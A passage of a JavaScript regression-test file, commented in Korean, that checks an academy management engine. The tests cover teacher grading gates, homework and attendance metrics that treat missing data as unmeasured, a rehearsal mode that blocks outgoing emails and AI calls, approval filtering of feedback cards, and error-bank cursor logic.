   *   골드가 애초에 도달 불가다. 관문이 실제로 일하는 곳은 **첫 시즌**이고(승급 통과율로 대체 · 승급은
   *   60%면 만점이라 70%로도 골드가 나온다), 정본이 그 대체 조항을 둔 이유가 정확히 이것이다.
   *   그래서 발동하는 자리로 검사한다 — 「닿지 않는 조건」을 통과로 세면 회귀가 거짓 초록이 된다. */
  assert.equal(grade(평시(20, 20, 10, 10, 10), { 재등록률: 75, 근태위반: 0 }).총점, 78,
    '평시 관문 ① 의 도달 불가 전제가 깨졌다 — 재등록<80 인데 총점이 골드권이면 이 검사를 다시 짜야 한다');
  // 첫 시즌 = 재등록 항목이 **사라지고**(0점이 아니다) 그 30점이 나머지 넷의 만점으로 옮겨 간다
  const 첫시즌항목 = (승, 복, 숙, 근) => [{ 이름: '승급', 점수: 승, 만점: 30 }, { 이름: '복귀', 점수: 복, 만점: 30 },
    { 이름: '숙제', 점수: 숙, 만점: 15 }, { 이름: '근태', 점수: 근, 만점: 15 }];
  r = grade(첫시즌항목(30, 30, 15, 15), { 첫시즌: true, 승급률: 70, 근태위반: 0 });
  assert.equal(r.총점, 100, '첫 시즌 4항목 만점이 100점이 아니다 — 재정규화가 어긋났다');
  assert.equal(r.등급, '실버', `첫 시즌 대체 관문(승급<80)이 안 걸렸다: ${r.표기}`);

  /* 관문 ② 근태 3회 이상 → 총점 무관 1단계 강등.
   * ⚠ ②와 ③은 항상 함께 터진다 — 3회 위반이면 근태 배점이 0점이라 「0점 항목」에도 걸린다.
   *   순서가 정해져 있다: ③이 골드를 막아 실버로 내리고, 그 위에 ②가 한 칸 더 내린다. */
  r = grade(평시(20, 20, 30, 10, 0), { 재등록률: 95, 근태위반: 3 });
  assert.equal(r.총점, 89, '89점 = 실버권이어야 이 검사가 강등을 재는 의미가 있다');
  assert.equal(r.등급, '브론즈', `근태 3회 위반인데 강등이 없다(실버에서 한 칸 내려와야 한다): ${r.표기}`);
  assert.equal(grade(평시(20, 20, 30, 10, 10), { 재등록률: 95, 근태위반: 2 }).등급, '골드',
    '근태 2회는 강등 대상이 아닌데 등급이 깎였다 — 경계가 「3회 이상」이다');
  // 관문 ③ 어느 항목이든 0점 → 골드 불가. 단 **미측정은 0점으로 안 센다**(위 재정규화 검사가 짝)
  r = grade(평시(0, 20, 30, 10, 10), { 재등록률: 95, 근태위반: 0 });
  assert.ok(r.등급 !== '골드', `0점 항목이 있는데 골드다: ${r.표기}`);

  // 등급 경계 — 92/82/70 은 「이상」이다. 한 칸 밀리면 배수가 통째로 바뀐다(1.3 vs 1.15 vs 1.0 vs 0.5)
  const 총점만 = (n) => grade([{ 이름: 'x', 점수: n, 만점: 100 }], { 재등록률: 95, 근태위반: 0 });
  [[92, '골드'], [91, '실버'], [82, '실버'], [81, '브론즈'], [70, '브론즈'], [69, '미달']]
    .forEach(([n, g]) => assert.equal(총점만(n).등급, g, `${n}점 → ${g} 여야 한다`));
});

/* ── [v9.211] 숙제·근태 집계 — 유호 확정 2026-08-08 「릴스·자격 외 전부 자동화」의 마지막 20점 ────────
 * v9.194 는 채점 함수·구간표·열까지 세우고 `const hwRate = null, 근태위반 = null` 로 뒀다. 즉 화면은
 * 완성돼 있었고 **재료만 안 흘렀다** — 그 상태의 출력은 「아직 개원 전이라 데이터가 없다」와 구별이 안 된다.
 * 그래서 아래는 전부 **양수 값**을 단언한다(빈칸/미측정만 보면 미실행과 같은 모양이다 · F207). */
const 평일반_T = { '정규반1': { type: '평일', time: '09:00', name: '정규반1' } };

test('[v9.211] 숙제 제출률 — 분모는 반 시간표에서 유도하고 분자는 (학생·날짜) 중복을 접는다', () => {
  const 날 = 시즌날_T().filter((x) => x.dow >= 1 && x.dow <= 5);
  assert.equal(날.length, 40, '8주 창의 평일이 40일이 아니다 — 아래 기대값의 전제가 깨졌다');
  const [d1, d2] = [ymd_T(날[0].d), ymd_T(날[1].d)];
  const { byLabel } = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'),
      mkStu('S1', '정규반1', 10, 100, 2), mkStu('S2', '정규반1', 20, 200, 4)],
    sched: 평일반_T,
    hwRows: [['F1', 'S1', d1], ['F2', 'S1', d1], ['F3', 'S1', d2],   // 같은 날 두 번 = 하루로 접힌다
      ['F4', 'S9', d1],                                             // 담당 밖 학생 = 남의 강사 몫
      ['F5', 'S2', ymd_T(new Date(Date.now() - 400 * 86400000))]]  // 창 밖 = 안 센다
  });
  const bat = byLabel('바트');
  // 분자 2(S1 의 서로 다른 제출일) / 분모 80(학생 2 × 평일 40) → 3%
  assert.equal(bat[21], '승급 0 · 복귀 0 · 재등록 0 · 숙제 2/80 · 근태 미측정 · 첫 시즌(재등록 항목 없음)',
    `지표모수가 숙제 원수치를 안 낸다 — "3%"가 몇 분의 몇인지 원장이 판별할 수 없다: ${bat[21]}`);
  assert.equal(bat[15], 3, `숙제 제출률이 2/80 에서 나오지 않았다: ${bat[15]}`);
  assert.equal(bat[16], 0, '3% 인데 숙제 배점이 0이 아니다(구간 60% 미만 = 0점)');
});

test('[v9.211] 근태 — 근무표를 담당 반 시간표에서 유도한다(지각·결근 각 1건)', () => {
  const 날 = 시즌날_T().filter((x) => x.dow >= 1 && x.dow <= 5);
  const 찍기 = (d, hh) => { const x = new Date(d); x.setHours(hh, 0, 0, 0); return ['바트', '출근', x]; };
  const rows = 날.map((x, i) => (i === 0 ? 찍기(x.d, 10)      // 첫 수업 09:00 뒤 출근 = 지각
    : i === 1 ? null                                          // 기록 없음 = 결근
      : i === 2 ? 찍기(x.d, 9)                                // 정각 = 지각이 아니다(경계는 「늦으면」)
        : 찍기(x.d, 8))).filter(Boolean);
  const { byLabel } = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)],
    sched: 평일반_T, checkins: rows
  });
  const bat = byLabel('바트');
  assert.equal(bat[17], 2, `지각 1 + 결근 1 = 2건이어야 한다: ${bat[17]}`);
  assert.equal(bat[18], 4, '첫 시즌 근태 2회 = 4점(정본 §7 첫 시즌표)');
  assert.match(String(bat[21]), /근태 40일/, '근무일(분모)이 지표모수에 안 보인다');
  // 토요일에만 찍으면 근무일이 아니라 위반이 아니다 — 요일 판정이 classDowOk_ 하나에서 나오는지
  const 토 = 시즌날_T().filter((x) => x.dow === 6);
  const 주말 = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '주말반1', 'bat@synk.im'), mkStu('S1', '주말반1', 10, 100, 2)],
    sched: { '주말반1': { type: '주말', time: '11:00', name: '주말반1' } },
    checkins: 토.map((x) => 찍기(x.d, 10))
  }).byLabel('바트');
  assert.equal(주말[17], 0, `주말반은 토요일만 근무일인데 위반이 났다: ${주말[21]}`);
  assert.match(String(주말[21]), /근태 8일/, '주말반 근무일이 8일(8주 × 토 1회)이 아니다');
});

/* ── [v9.211] ①배포 검수(codex/luna·max)가 잡은 급여 경로 3건 — 전부 「못 잰 것이 점수가 된다」 축이다.
 *   내 자기검증(회귀 4 · 변이 9/9)을 통과한 뒤에 나온 지적이라, 같은 벤더끼리는 사각도 같이 움직인다는
 *   증거로 남긴다. 아래 셋은 고친 자리마다 하나씩 못박는다. */
test('[v9.211] ☠️ 강의 한줄요약 행이 숙제 제출로 세어지면 안 된다 — 제출률 → 인센티브 → **급여**로 번진다', () => {
  /* v9.198 이 강의 요약을 같은 `hw_feedback` 에 `숙제ID` = `강의:<id>` 로 적는데, 이 집계는 A:C 만
   * 읽어 그 접두를 못 봤다. 숙제를 안 낸 날의 요약 한 건이 제출로 세어진다 — ①배포 검수 2회차가
   * 독립으로 같은 자리를 짚었고, 그때 이 판은 **라이브 직전**이었다. */
  const 반 = { '정규반1': { type: '평일', time: '09:00', name: '정규반1' } };
  const 요약행 = (sid, d) => { const r = new Array(12).fill(''); r[0] = 'x'; r[1] = sid; r[2] = d; r[11] = '강의:LEC1'; return r; };
  const 숙제행 = (sid, d) => { const r = new Array(12).fill(''); r[0] = 'x'; r[1] = sid; r[2] = d; r[11] = 'HW7'; return r; };
  const 준 = (hwRows) => runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)],
    sched: 반, hwRows
  }).byLabel('바트');

  const 어제 = ymd_T(시즌날_T()[0].d);
  // ① 강의 요약**만** 있는 날 → 그 날은 제출이 아니다. 원천이 0이라 **미측정**으로 떨어져야 한다.
  const 요약만 = 준([요약행('S1', 어제)]);
  assert.strictEqual(요약만[15], '', `강의 요약이 숙제 제출률로 세어졌다: ${요약만[15]}`);
  assert.strictEqual(요약만[16], '', '강의 요약이 숙제 배점을 만들었다 — 급여가 부풀려진다');

  // ② 같은 날 숙제도 있으면 숙제 쪽은 그대로 세어진다 — 걷어내기가 진짜 제출까지 먹으면 반대 방향 사고다
  const 둘다 = 준([요약행('S1', 어제), 숙제행('S1', 어제)]);
  assert.notStrictEqual(둘다[15], '', '숙제 행이 있는데 미측정이 됐다 — 걷어내기가 너무 넓다');

  /* ③ 구 시트(3열)에서도 안 죽는다 — 12열을 무조건 요구하면 이 집계가 통째로 멎는다.
   * 🔑 실패 모양은 **예외가 아니라 조용한 미측정**이다(이 구역이 try 로 감싸여 있다) — 그래서
   *   doesNotThrow 로 재면 영원히 초록이다. 실제로 그렇게 짰다가 변이가 빠져나갔다. */
  const 구시트 = 준([['x', 'S1', 어제]]);
  assert.notStrictEqual(구시트[15], '',
    '좁은 구 시트(3열)에서 숙제 집계가 통째로 죽었다 — 폭을 물리 열수로 클램프해야 한다');
});

test('[v9.211] 🔴 hw_feedback 원천이 비면 미측정이다 — `0 / 80` 은 잰 0점으로 읽혀 관문 ③ 까지 터진다', () => {
  const 반 = { '정규반1': { type: '평일', time: '09:00', name: '정규반1' } };
  const 준 = (hwRows) => runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)],
    sched: 반, hwRows
  }).byLabel('바트');

  // ① 시트 자체가 없다 → 미측정. 개원 전이 정확히 이 상태다(전 강사가 즉시 0점이 되면 안 된다)
  const 없음 = 준(null);
  assert.strictEqual(없음[15], '', `hw_feedback 이 없는데 제출률 0% 가 찍혔다: ${없음[15]}`);
  assert.strictEqual(없음[16], '', '숙제 배점이 0점 — 앱이 못 잰 것이 급여 삭감이 됐다');
  assert.match(String(없음[21]), /숙제 미측정/, '지표모수가 「0/80」 처럼 잰 척한다');
  assert.doesNotMatch(String(없음[20]), /관문/, `미측정인데 0점 관문이 발동했다: ${없음[20]}`);

  // ② 헤더뿐(행 0)도 같다 — getLastRow() >= 2 를 지나도 창 안 유효 행이 0이면 잰 적이 없다
  assert.strictEqual(준([])[15], '', '헤더만 있는 시트가 「0% 측정됨」으로 읽혔다');
  // ③ 창 밖 행만 있는 경우도 같다(8주 전 파이프라인이 끊긴 것과 「0% 성실도」가 구별이 안 된다)
  assert.strictEqual(준([['F1', 'S1', ymd_T(new Date(Date.now() - 400 * 86400000))]])[15], '',
    '창 밖 행만 있는데 0% 로 측정됐다');
  // ④ 🔑 반대 방향 — 원천이 있으면 「내 학생만 0건」은 **진짜 0%** 다(남의 행이 그 사실을 증명한다)
  const 남의행만 = 준([['F1', 'S9', ymd_T(new Date(Date.now() - 86400000))]]);
  assert.strictEqual(남의행만[15], 0, `원천이 있는데 0% 가 미측정으로 접혔다 — 성실도 결손이 숨는다: ${남의행만[15]}`);
});

test('[v9.211] 분자와 분모가 같은 창을 본다 — 오늘치 제출이 분모 없이 분자에만 들어가면 비율이 부푼다', () => {
  const 반 = { '정규반1': { type: '평일', time: '09:00', name: '정규반1' } };
  const 어제 = ymd_T(시즌날_T()[0].d), 오늘 = ymd_T(new Date());
  const r = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)],
    sched: 반, hwRows: [['F1', 'S1', 어제], ['F2', 'S1', 오늘]]
  }).byLabel('바트');
  // 분모는 어제까지 40 평일. 오늘치까지 세면 2/40 = 5%, 창을 맞추면 1/40 = 3%.
  assert.match(String(r[21]), /숙제 1\/40/, `오늘치가 분자에 섞였다(분모엔 오늘이 없다): ${r[21]}`);
});

test('[v9.211] 깨진 출근 시각 한 행이 전 강사의 근태를 날리지 않는다', () => {
  const 반 = { '정규반1': { type: '평일', time: '09:00', name: '정규반1' } };
  const 날 = 시즌날_T().filter((x) => x.dow >= 1 && x.dow <= 5);
  const 찍기 = (d, hh) => { const x = new Date(d); x.setHours(hh, 0, 0, 0); return ['바트', '출근', x]; };
  const rows = 날.map((x) => 찍기(x.d, 8));
  rows.unshift(['바트', '출근', '어제쯤']);      // 파싱 불가 — asDate_ → Invalid Date → formatDate 예외
  const r = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)],
    sched: 반, checkins: rows
  }).byLabel('바트');
  assert.strictEqual(r[17], 0, `깨진 행 하나에 근태 전체가 죽었다(빈칸) — 나머지 40일은 멀쩡했다: ${r[21]}`);
  assert.match(String(r[21]), /근태 40일/, '근무일 집계가 예외로 끊겼다');
});

test('[v9.211] 🔴 출근 기록이 하나도 없는 강사는 미측정이다 — 전원 결근으로 읽으면 앱 결함이 급여 삭감이 된다', () => {
  const 없음 = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)],
    sched: 평일반_T, checkins: []
  }).byLabel('바트');
  assert.strictEqual(없음[17], '', `근태 미측정이 숫자로 찍혔다 — 이름 표기 하나만 어긋나도 위반 40건이 된다: ${없음[17]}`);
  assert.strictEqual(없음[18], '', '근태 배점이 0점으로 환산됐다 — 관문 ②③ 이 함께 터져 등급이 두 칸 내려간다');
  assert.doesNotMatch(String(없음[20]), /관문/, `미측정인데 관문이 발동했다: ${없음[20]}`);
  // 시간표에 없는 반도 같다 — 기대 제출 수를 못 세면 0%가 아니라 빈칸이다
  const 무시간표 = runTeacherStats_({
    profileRows: [mkTeacher('T1', '바트', '정규반1', 'bat@synk.im'), mkStu('S1', '정규반1', 10, 100, 2)],
    sched: {}, hwRows: [['F1', 'S1', ymd_T(new Date(Date.now() - 86400000))]]
  }).byLabel('바트');
  assert.strictEqual(무시간표[15], '', '시간표가 없어 분모를 못 세는데 제출률이 숫자로 나왔다');
  assert.strictEqual(무시간표[16], '', '분모를 못 셌는데 숙제 배점이 0점으로 찍혔다 — 0%(냈어야 했는데 안 냈다)와 다르다');
});

test('[v9.211] 집계가 실제로 배선돼 있다 — 상수 null 로 되돌아가면 화면은 개원 전과 구별이 안 된다', () => {
  const body = section('function calcTeacherStats()', 'function monthlyReport()');
  assert.equal(/const hwRate = null, 근태위반 = null/.test(코드만(body)), false,
    'v9.194 의 미측정 고정판이 되살아났다 — 채점 함수는 그대로라 회귀 대부분이 초록인 채 20점이 죽는다');
  assert.ok(body.includes('hwBy[k]') && body.includes('puBy[k]'), '행 조립이 집계 결과를 안 읽는다');
  /* 🔴 창은 **어제부터**다(i = 1). 오늘을 넣으면 아직 안 끝난 날이 결근으로 잡혀 매일 오전마다 전 강사가
   *   위반 +1 이 된다 — 그런데 8주 창의 평일 수는 시작을 하루 당겨도 40 그대로라 **개수로는 안 걸린다.**
   *   기대값이 못 잡는 자리라 여기서 의도를 못박는다(변이 실측에서 조용히 빠져나간 자리). */
  assert.ok(/for \(let i = 1; i <= ABSENCE_SEASON_DAYS; i\+\+\)/.test(body),
    '시즌 창이 오늘을 포함한다 — 근태가 매일 오전 「결근」을 만든다');
  // 요일 규칙은 단일 소스여야 한다 — 여기 요일 숫자를 다시 적으면 주말반 규칙이 갈라진다(v9.46)
  assert.equal(/dow\s*[><=]=?\s*[0-6]/.test(코드만(body)), false, 'calcTeacherStats 가 요일 규칙을 자기 안에 다시 적었다 — classDowOk_ 를 써야 한다');
  // teacher_checkins 열 순서는 TC_* 상수 하나에서 나온다(하네스가 ['이름','구분','시각']로 픽스처를 짠다)
  assert.ok(/TC_NAME_COL - 1/.test(body) && /TC_TIME_COL - 1/.test(body), '체크인 열을 상수 대신 숫자로 박았다');
  assert.ok(code.includes("['teacher_checkins', ['이름','구분','시각']]"),
    '체크인 시트 골격이 하네스 픽스처와 갈라졌다 — 열 순서가 바뀌면 이 회귀가 낡은 판을 지킨다');
});

test('[v9.120] 배치 리허설 — 밖으로 나가는 것만 막고, 켜둔 채 잊어도 안전하다', () => {
  // 목적: 개원 전에 배치를 "돌려보고" 검증한다. 지금까지는 돌리면 학부모에게 진짜 메일이 가고
  // AI 비용이 청구돼, 새 배치를 하룻밤 기다리거나 정적 검증으로 때워야 했다.
  // ① 관문 — 메일 발송이 전부 quotaOk를 지나야 이 설계가 성립한다(한 곳을 막으면 전부 막힌다)
  const lines = code.split(/\r?\n/);
  const ungated = lines.filter((l, i) => /MailApp\.sendEmail/.test(l)
    && !/quotaOk\(/.test(lines.slice(Math.max(0, i - 12), i + 1).join('\n')));
  assert.deepEqual(ungated.map((l) => l.trim().slice(0, 60)), [],
    '관문(quotaOk) 밖 발송이 있다 — 리허설 중에도 이 메일은 실제로 나간다');

  // ② 게이트 3종 — 메일·AI 텍스트·AI 첨삭
  const q = section('function quotaOk(needed)', 'function playStyleOf_(');
  assert.ok(q.includes('isRehearsal_()') && q.includes('return false'), 'quotaOk에 리허설 게이트가 없다');
  assert.ok(section('function aiText_(', 'function aiStudents_(').includes('isRehearsal_()'), 'aiText_ 게이트 없음(API 비용)');
  assert.ok(section('function callClaudeFeedback_(', 'function parentSweep()').includes('isRehearsal_()'), 'callClaudeFeedback_ 게이트 없음(API 비용)');

  // ③ 켜둔 채 잊는 것이 가장 큰 위험 — 이중 안전장치
  const infra = section('const REHEARSAL_UNTIL_KEY', 'function quotaOk(needed)');
  assert.ok(infra.includes('Date.now() > until'), 'TTL 자동 만료가 없다 — 켜두면 알림이 영영 죽는다');
  assert.ok(infra.includes('catch (e) { return false; }'), '판정 실패 시 리허설로 떨어지면 알림을 조용히 삼킨다');
  ['function nightJobs()', 'function morningJobs()'].forEach((fn) => {
    const body = code.slice(code.indexOf(fn), code.indexOf(fn) + 400);
    assert.ok(body.includes('rehearsalForceOff_()'), `${fn} 진입 시 강제 해제가 없다 — 그날 알림이 통째로 죽는다`);
  });

  // ④ 배치 실행 항목은 리허설 밖에서 스스로 거부해야 메뉴에 올릴 수 있다
  const run = section('function rehearseRun_(', 'function quotaOk(needed)');
  assert.ok(run.includes('if (!isRehearsal_())') && run.includes('return;'),
    '리허설 가드 없이 배치가 도는다 — 클릭 한 번이 학부모 메일 발송이 된다');

  // ⑤ 차단된 것을 기록해야 리허설이 의미를 갖는다("무엇이 나갈 뻔했나")
  assert.ok(q.includes('rehearsalNote_('), '차단 기록이 없다 — 아무것도 안 한 것과 구별되지 않는다');
  assert.ok(infra.includes('REHEARSAL_LOG_MAX'), '기록 폭주 상한이 없다(Properties 용량)');
});

/* ── [v9.211] hw_feedback I열(상태) 판정 ── 이종 검수 P1(#9136f31e61a9) 이 잡은 자리.
 *   소비처가 허용목록·거부목록 **두 방언**으로 갈려 있었고, 거부목록 쪽 3곳이 `대기`(검토자 미승인)를
 *   통과시켰다. `AI_FEEDBACK_AUTOPUBLISH=false`(구 검수 모드 폴백)로 가는 순간 승인 안 된 카드가
 *   약점맵→AI 퀴즈·오류사전·성장카드로 흘러든다 — 사람이 눌러 넘기는 칸(검수 확정)의 우회로다. */
const 노출카드정본 = () => {
  const m = engineSource().match(/function 노출카드_\([\s\S]*?\n\}/);
  assert.ok(m, '노출카드_ 정본이 엔진에 없다 — 판정이 다시 호출부로 흩어졌다');
  return new Function(`${m[0]}; return 노출카드_;`)();
};

test('🔑 노출카드_ 는 `노출` 하나만 통과시킨다 — 빈칸·대기·격리는 전부 미노출로 친다', () => {
  const 노출카드_ = 노출카드정본();
  assert.equal(노출카드_('노출'), true, '정상 카드를 막는다 — 재료가 통째로 사라진다');
  for (const v of ['대기', '격리:품질미달', '오류:API', '', null, undefined, '노출 ', ' 노출', '노출대기', '미노출'])
    assert.equal(노출카드_(v), false, `"${v}" 를 통과시킨다 — 승인 안 된 카드가 학생 출력으로 나간다`);
});

test('☠️ hw_feedback 상태 판정에 날 거부목록이 없다 — 그 표기가 `대기` 를 통과시키던 자리다', () => {
  const 남은 = (engineSource().match(/\/\^\(오류\|격리\)\/[^\n]*/g) || []);
  assert.equal(남은.length, 0,
    `거부목록 표기 ${남은.length}건 — 그 자리는 검토자 미승인 카드를 학생 출력으로 통과시킨다:\n  ` + 남은.join('\n  '));
});

test('☠️ 상태를 읽는 소비처가 **전부** 노출카드_ 를 탄다 — 판정이 갈리면 새는 방향은 언제나 「통과」다', () => {
  /* 정본 함수 본문 자체는 제외하고(거기가 유일하게 리터럴을 쓰는 자리), 소비처가 상태 칸을
   * 직접 문자열 비교하는 자리가 남았는지 본다. 남으면 방언이 둘로 돌아간 것이다. */
  const 소비처 = engineSource().replace(/function 노출카드_\([\s\S]*?\n\}/, '');
  const 직접 = (소비처.match(/\[8\][^\n]{0,40}['"]노출['"]/g) || []);
  assert.equal(직접.length, 0, `상태 칸을 직접 비교하는 자리 ${직접.length}건:\n  ` + 직접.join('\n  '));
});

/* ── [v9.211] 오류뱅크 커서 ── 재검수 P1(#9c7967e921d4)이 잡은 자리: v9.210 이 필터는 정본으로
 *   바꿨지만 커서는 필터 **전** 행 수(takeN)로 전진해, 수동 검수 모드(AI_FEEDBACK_AUTOPUBLISH=false)의
 *   `대기` 카드가 승인 뒤에도 커서 뒤에 남아 error_bank 에서 영구 누락됐다. 커서는 판정 전 행 앞에서 멈춘다. */
const 커서정본 = () => {
  const src = engineSource();
  const f1 = src.match(/function 노출카드_\([\s\S]*?\n\}/);
  const f2 = src.match(/function 닫힌카드_\([\s\S]*?\n\}/);
  const f3 = src.match(/function 오류뱅크전진_\([\s\S]*?\n\}/);
  const c1 = src.match(/const 격리복구창_MS = [^\n]+/);
  assert.ok(f2, '닫힌카드_ 정본이 엔진에 없다 — 「지나가도 되는 상태」 판정이 호출부로 흩어졌다');
  assert.ok(f3, '오류뱅크전진_ 정본이 엔진에 없다 — 커서 판정이 호출부로 돌아갔다');
  assert.ok(c1, '격리복구창_MS 정본이 엔진에 없다 — 격리 오탐 복구(야간 메일 안내)의 유예가 사라졌다');
  // toDate_ 는 엔진 전역 — 여기선 같은 계약(Date/문자열/falsy)의 스텁을 준다
  const toDateStub = 'const toDate_ = (v) => (v instanceof Date ? v : (v ? new Date(v) : null));';
  // ⚠ 반드시 개행으로 잇는다 — c1[0] 은 줄 끝 // 주석까지 담고 있어, 세미콜론·공백으로 이으면
  //   LF 체크아웃(리눅스 CI)에서 주석이 뒤의 function 선언을 삼킨다(재검수 P1 3e81de25fa18 —
  //   CRLF 로컬에선 \r 이 우연히 주석을 끊어 초록이었다. 로컬 초록 ≠ CI 초록의 실물).
  return new Function(`${toDateStub}\n${c1[0]}\n${f1[0]}\n${f2[0]}\n${f3[0]}\nreturn 오류뱅크전진_;`)();
};

test('🔑 오류뱅크 커서는 판정 전(대기·빈칸·복구 창 안의 격리) 앞에서 멈춘다 — 지나가면 승인·복구 뒤에도 영구 누락', () => {
  const 걷기 = 커서정본();
  const 지금 = Date.UTC(2026, 7, 12);
  const 갓 = new Date(지금 - 86400000);     // 어젯밤 생성 — 복구 창 안(커서는 카드 생성과 같은 밤에 돈다)
  const 낡 = new Date(지금 - 8 * 86400000); // 8일 전 — 복구 창 밖
  assert.deepEqual(걷기(['노출', '격리:품질미달', '노출'], [갓, 갓, 갓], 지금), { 집을행: [0], 전진: 1 },
    '복구 창 안의 격리를 지나갔다 — 다음 날 아침의 오탐 복구(격리→노출 · 야간 메일 안내)가 전부 영구 누락된다');
  assert.deepEqual(걷기(['노출', '격리:품질미달', '노출'], [낡, 낡, 낡], 지금), { 집을행: [0, 2], 전진: 3 },
    '복구 창이 지난 격리 앞에서 멈춘다 — 정당한 격리는 사람이 안 치우는 것이 정상이라 커서가 영원히 서고 error_bank 가 굶는다');
  assert.deepEqual(걷기(['노출', '대기', '노출'], [낡, 낡, 낡], 지금), { 집을행: [0], 전진: 1 }); // 대기 앞까지만 — 뒤를 집으면 다음 밤 같은 행이 두 번 집힌다
  assert.deepEqual(걷기(['대기', '노출'], [낡, 낡], 지금), { 집을행: [], 전진: 0 });               // 머리가 대기면 이번 밤은 쉰다(다음 밤 재시도)
  assert.deepEqual(걷기(['오류:API', '격리:저품질'], [갓, 낡], 지금), { 집을행: [], 전진: 2 });    // 오류=날짜 무관 즉시 닫힘 · 창 밖 격리=닫힘
  assert.deepEqual(걷기(['', '노출'], [낡, 낡], 지금), { 집을행: [], 전진: 0 });                   // 빈칸·낯선 값=판정 전 취급 — 틀릴 때 방향이 유실이 아니라 지연
  assert.deepEqual(걷기(['격리:x', '노출'], [null, 낡], 지금), { 집을행: [1], 전진: 2 },
    '날짜를 못 읽는 격리는 닫힘(뒤 노출은 정상 집힘) — 커서 영구 정체(전량 굶김)가 한 행 유실보다 나쁘다');
  assert.deepEqual(걷기(['격리:x', '노출'], [new Date('not-a-date'), 낡], 지금), { 집을행: [1], 전진: 2 },
    'Invalid Date 격리가 NaN 비교로 「판정 전」이 되면 커서가 그 행에 영구 정지한다(재검수 P2 0d609066a254)');
  assert.deepEqual(걷기(['격리:x'], [new Date(지금 - 7 * 86400000)], 지금), { 집을행: [], 전진: 1 },
    '정확히 창 경계(7일)는 닫힘(>=) — 경계가 「판정 전」이면 하루 더 서고, 창이 8일로 늘면 문구·판정이 갈린다');
});

test('🔑 대기 승인·격리 오탐 복구(→노출)는 다음 밤 같은 자리부터 집힌다 — 재검수 P1 두 계열 재현', () => {
  const 걷기 = 커서정본();
  const 지금 = Date.UTC(2026, 7, 12);
  const 갓 = new Date(지금 - 86400000);
  assert.equal(걷기(['대기', '노출'], [갓, 갓], 지금).전진, 0, '커서가 대기를 지나갔다 — 승인해도 영구 누락된다');
  assert.equal(걷기(['격리:품질미달', '노출'], [갓, 갓], 지금).전진, 0, '커서가 갓 격리를 지나갔다 — 오탐 복구가 영구 누락된다');
  // 다음 날 아침 검토자가 승인·복구한 뒤의 밤: 커서가 안 움직였으니 같은 from 에서 다시 읽은 슬라이스가 이렇게 보인다
  assert.deepEqual(걷기(['노출', '노출'], [갓, 갓], 지금 + 86400000), { 집을행: [0, 1], 전진: 2 }); // 승인·복구된 카드가 집힌다 — 유실 0
});

test('☠️ 오류사전 커서가 필터 전 행 수(takeN)로 전진하지 않는다 — 그 표기가 대기 행을 영구 통과시키던 자리다', () => {
  const src = engineSource(); // 아래 «긍정» 단언은 원문을 본다 — 정제본으로 바꾸면 뜻이 달라진다
  /* 부정 단언만 모듈 상단 `코드정제`(= `코드만(engineSource())` · 같은 글)를 쓴다 —
   *   여기서 또 `코드만(src)` 를 부르면 1.28MB 를 한 번 더 렉싱한다(실측 +0.6초). */
  assert.ok(!코드정제.includes('String(from + takeN)'), '오류뱅크_포인터가 필터 전 행 수로 전진한다(재검수 P1 원상 복귀)');
  assert.ok(src.includes('오류뱅크전진_(슬라이스.map(r => r[8]), 슬라이스.map(r => r[2]), Date.now())'),
    '오류사전 로더가 커서 통로(상태 I열+제출일 C열 — 격리 복구 창의 기준)를 안 탄다');
});

/* ── [vNEXT] 오류사전 포이즌 필 — 「성공 시에만 전진」의 그림자(컨텍스트 독립 리뷰 P2-④ · 08-13) ──
 * aiCall_ 이 같은 슬라이스에서 밤마다 던지면(영구 오류·재료 유도형 옛글자) 커서가 영원히 서고
 * error_bank 만 조용히 굶는다 — 관리자 메일엔 같은 오류가 매밤 쌓이지만 「커서가 섰다」는 어디에도 없다. */
const 포이즌정본 = () => {
  const f = engineSource().match(/function 오류뱅크포이즌_\([\s\S]*?\n\}/);
  assert.ok(f, '오류뱅크포이즌_ 정본이 엔진에 없다 — 연속 실패 판정이 호출부로 흩어졌다');
  return new Function(`${f[0]}\nreturn 오류뱅크포이즌_;`)();
};

test('🔑 오류사전 포이즌 필 — 연속 3밤 실패면 확정 접두만 포기하고 전진한다', () => {
  const 판 = 포이즌정본();
  assert.deepEqual(판(undefined, 12), { 전진: false, 카운터: 1 }, '첫 실패에 바로 전진하면 일시 장애(429·5xx)에도 재료를 버린다');
  assert.deepEqual(판('1', 12), { 전진: false, 카운터: 2 });
  assert.deepEqual(판('2', 12), { 전진: true, 카운터: 0 }, '세 번째 연속 실패인데 안 전진한다 — 커서가 영원히 선다(P2-④ 원상)');
  assert.deepEqual(판('7', 0), { 전진: false, 카운터: 8 }, '전진 폭 0(판정 전 행이 머리)인데 전진했다 — v9.212 불변식(승인·복구 뒤 재수집)이 깨진다');
  assert.deepEqual(판('오염된 값', 12), { 전진: false, 카운터: 1 }, '카운터가 숫자가 아니면 0 부터 다시 센다 — 낯선 값이 즉시 전진으로 접히면 안 된다');
});

test('🔑 포이즌 필 배선 — aiCall_ 실패가 카운터를 걷고, 성공·전진이 카운터를 끊는다', () => {
  const src = engineSource();
  const i = src.indexOf('오류 사례(제출→교정)');
  assert.ok(i !== -1, '오류사전 aiCall_ 자리를 못 찾았다 — 표식이 낡았으면 이 검사는 공회전이다(F207)');
  const 근처 = src.slice(Math.max(0, i - 400), i + 1800);
  assert.ok(근처.includes('오류뱅크포이즌_('), '오류사전 aiCall_ 이 포이즌 판정을 안 탄다 — 같은 슬라이스를 영구 재시도한다');
  assert.ok((근처.match(/deleteProperty\('오류뱅크_연속실패'\)/g) || []).length >= 2,
